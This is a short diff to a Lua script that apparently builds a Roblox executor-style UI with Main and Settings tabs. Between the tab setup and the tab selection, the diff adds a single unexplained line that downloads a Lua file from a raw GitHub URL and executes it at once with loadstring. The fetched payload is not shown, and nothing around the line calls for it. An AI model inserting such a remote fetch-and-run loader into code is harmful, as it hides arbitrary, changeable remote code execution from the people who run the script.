@@ -28,6 +28,7 @@ local Tabs = {
     Main = Window:AddTab({ Title = "Main", Icon = "box" }),
     Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
 Window:SelectTab(1)
 do
     Tabs.Main:AddParagraph({
